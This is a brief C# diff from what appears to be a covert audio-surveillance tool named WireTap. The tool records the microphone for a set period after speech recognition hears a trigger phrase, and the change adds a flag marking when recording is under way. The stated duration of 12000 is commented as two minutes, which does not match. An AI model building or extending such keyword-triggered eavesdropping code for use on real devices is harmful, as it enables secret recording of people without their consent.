@@ -88,7 +88,9 @@ namespace WireTap
                     string fname = Helpers.CreateTempFileName(".wav");
                     Console.WriteLine("[!] Heard interesting phrase {0}, staring two-minute recording.", result.Text);
                     Console.WriteLine("[!] Filename: {0}", fname);
+                    recording = true;
                     RecordMicrophone(fname, 12000);// begin recording for two minutes.
+                    recording = false;
                     Console.WriteLine("[!] Finished recording. File at: {0}", fname);
                 }
                 else if (recording)
